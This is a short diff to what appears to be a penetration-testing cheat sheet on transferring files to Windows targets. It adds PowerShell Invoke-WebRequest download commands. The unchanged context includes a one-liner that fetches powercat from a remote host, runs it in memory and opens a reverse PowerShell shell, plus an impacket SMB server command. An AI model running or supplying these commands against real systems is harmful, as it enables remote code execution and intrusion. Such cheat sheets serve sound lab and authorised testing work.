@@ -116,6 +116,12 @@ download file
 download a file and execute from memory with powercat
 `IEX(New-Object System.Net.Webclient).DownloadString('http://10.1.1.1:8000/powercat.ps1');powercat -c 10.1.1.1 -p 8001 -e powershell.exe`
 
+#### PowerShell Invoke-WebRequest
+`powershell Invoke-WebRequest -url http://10.10.10.10:9000/file.txt`
+
+shorthand
+`powershell IWR -url http://10.10.10.10:9000/file.txt -OutFile C:\\Windows\\temp\\file.txt`
+
 ### smb
 localhost
 `sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1
